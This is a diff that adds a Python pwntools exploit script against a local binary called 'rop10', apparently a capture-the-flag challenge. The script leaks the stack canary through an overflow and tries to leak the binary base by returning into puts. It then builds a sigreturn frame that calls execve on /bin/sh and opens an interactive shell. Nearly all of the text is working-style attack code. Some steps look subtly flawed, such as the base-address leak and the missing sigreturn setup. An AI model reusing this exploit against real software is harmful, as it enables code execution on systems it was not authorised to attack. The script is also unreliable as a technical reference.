@@ -204,3 +204,140 @@
  'remotely, adjust the connection settings accordingly.\n'
  '- The paths and offsets might need adjustments based on the actual binary '
  'and its memory layout.')
+
+from pwn import *
+import re
+
+# Set up pwntools context
+context.arch = 'amd64'
+context.log_level = 'debug'
+
+# Load the ELF
+elf = ELF('./rop10')
+
+# Start the process
+p = elf.process()
+
+# Stage 1: Leak the Stack Canary
+def leak_canary():
+    # Receive the initial prompt
+    p.recvuntil("What's your name?\n")
+
+    # Send initial input to 'buf' (placeholder data)
+    p.sendline('A')
+
+    # Receive the next prompt
+    p.recvuntil("correct (yes/no)?\n")
+
+    # Overflow 's1' to overwrite 'buf' and leak the canary
+    payload = b'A' * 16       # Fill 's1' buffer (size 16 bytes)
+    payload += b'B' * 8       # Overwrite potential padding
+    payload += b'C' * 24      # Overwrite 'buf' (24 bytes)
+    payload += b'D' * 8       # Overwrite 'v3' (canary)
+    # Send the payload
+    p.sendline(payload)
+
+    # Receive the next prompt
+    p.recvuntil("What's your name?\n")
+
+    # Receive the line that includes the leaked data
+    line = p.recvline()
+    log.info("Received line: " + line.decode())
+
+    # Extract the leaked data using a regular expression
+    match = re.search(b"Is your name `(.*)` correct", line)
+    if match:
+        leaked_data = match.group(1)
+        log.info("Leaked data: " + leaked_data.hex())
+    else:
+        log.error("Failed to leak data")
+        p.close()
+        exit()
+
+    # The canary is likely at the end of the leaked data
+    canary = leaked_data[-8:]
+    canary = b'\x00' + canary[1:]  # Ensure canary starts with null byte
+    log.success("Leaked canary: " + canary.hex())
+    return canary
+
+# Stage 2: Leak the Binary Base Address
+def leak_base_address(canary):
+    # Respond 'no' to continue the loop
+    p.sendline('no')
+
+    # Receive the prompt again
+    p.recvuntil("What's your name?\n")
+
+    # Send placeholder data
+    p.sendline('A')
+
+    # Receive the next prompt
+    p.recvuntil("correct (yes/no)?\n")
+
+    # Overflow 's1' to overwrite the return address and leak a function pointer
+    buffer_size = 16 + 8 + 24  # s1 + padding + buf
+    payload = b'A' * buffer_size
+    payload += canary          # Include the correct canary to pass the stack check
+    payload += b'B' * 8        # Overwrite saved RBP
+    payload += p64(elf.symbols['puts'])  # Overwrite return address with 'puts' function
+    payload += p64(elf.symbols['main'])  # Address to return after 'puts'
+
+    # Send the payload
+    p.sendline(payload)
+
+    # Receive the output from 'puts', which leaks an address
+    leaked_address = p.recvline().strip()
+    leaked_address += p.recvline().strip()
+    log.info("Leaked address data: " + leaked_address.hex())
+
+    # Parse the leaked address
+    leaked_address = u64(leaked_address.ljust(8, b'\x00'))
+    log.success("Leaked address: " + hex(leaked_address))
+
+    # Calculate the base address using the leaked address
+    base_address = leaked_address - elf.symbols['puts']
+    log.success("Calculated base address: " + hex(base_address))
+
+    return base_address
+
+# Stage 3: Perform the SROP Attack
+def exploit(canary, base_address):
+    # Adjust the ELF base address
+    elf.address = base_address
+
+    # Find 'syscall; ret' gadget
+    syscall_ret = next(elf.search(asm('syscall; ret')))
+    log.info("Found 'syscall; ret' gadget at: " + hex(syscall_ret))
+
+    # Create a SigreturnFrame
+    frame = SigreturnFrame()
+    frame.rax = constants.SYS_execve
+    frame.rdi = next(elf.search(b'/bin/sh\x00'))
+    frame.rsi = 0
+    frame.rdx = 0
+    frame.rip = syscall_ret
+
+    # Construct the payload
+    buffer_size = 16 + 8 + 24  # s1 + padding + buf
+    payload = b'A' * buffer_size
+    payload += canary          # Include the correct canary
+    payload += b'B' * 8        # Overwrite saved RBP
+    payload += p64(syscall_ret)   # Return to 'syscall; ret' gadget
+    payload += bytes(frame)    # Append the fake sigreturn frame
+
+    # Respond 'yes' to exit the loop
+    p.sendline('yes')
+
+    # Receive any remaining output
+    p.recvuntil("See you~\n")
+
+    # Send the final payload
+    p.sendline(payload)
+
+    # Interact with the shell
+    p.interactive()
+
+# Execute the exploit steps
+canary = leak_canary()
+base_address = leak_base_address(canary)
+exploit(canary, base_address)
